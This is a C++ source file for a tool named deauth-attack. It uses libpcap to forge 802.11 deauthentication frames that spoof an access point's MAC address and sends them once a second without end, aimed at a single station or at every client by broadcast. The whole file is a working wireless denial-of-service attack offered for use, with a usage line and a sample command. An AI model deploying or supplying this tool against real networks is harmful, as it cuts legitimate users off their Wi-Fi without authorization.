#include <cstdio>
#include <ifaddrs.h>
#include <pcap.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string>
#include <map>
#include "deauth-attack.h"

using namespace std;

char *dev;
char errbuf[PCAP_ERRBUF_SIZE];
pcap_t *handle;
struct pcap_pkthdr *header;
const u_char *packet;

void usage()
{
	printf("syntax: deauth-attack <interface> <ap mac> [<station mac>]\n");
	printf("sample: deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

int main(int argc, char* argv[])
{
	if (argc != 3 && argc != 4) {
		usage();
		return -1;
	}
	
	dev = argv[1];
	handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	deauth_packet packet;
	packet.rd_hdr.it_version = 0;
	packet.rd_hdr.it_pad = 0;
	packet.rd_hdr.it_len = 12;
	packet.rd_hdr.it_present = 0;
	
	packet.bc_hdr.type = 12;
	packet.bc_hdr.flags = 0;
	packet.bc_hdr.duration = 314;
	packet.bc_hdr.sequence = 0;
	packet.bc_hdr.saddr = Mac(argv[2]);
	packet.bc_hdr.daddr = argc == 3 ? Mac("FF:FF:FF:FF:FF:FF") : Mac(argv[3]);
	packet.bc_hdr.bssid = Mac(argv[2]);
	
	packet.bc_fxd.reason_code = htons(0x700);
	
	while(true) {
		int res = pcap_sendpacket(handle, reinterpret_cast<u_char*>(&packet), sizeof(packet));
		if(res < 0) {
			printf("Error occurred with send packet!\n");
			return -1;
		}
		printf("Success to send packet!\n");
		sleep(1);
	}

	pcap_close(handle);
	return 0;
}
